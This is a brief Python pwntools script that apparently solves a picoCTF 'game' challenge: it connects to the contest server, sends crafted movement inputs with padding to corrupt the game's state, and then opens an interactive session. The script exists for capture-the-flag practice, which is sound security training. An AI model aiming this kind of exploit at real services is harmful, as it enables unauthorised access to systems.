from pwn import *
# r = process("./game")
# gdb.attach(r, gdbscript='''
#            b*move_player+206
#            c
#            ''')
r = remote("saturn.picoctf.net", 58414)

# # input()
payload = b"ly"
r.sendafter(b".X\r\n", payload)

payload = b"wwwaaaaa" + b"a"*38 + b"w"
r.sendafter(b"..X\r\n", payload)

r.interactive()
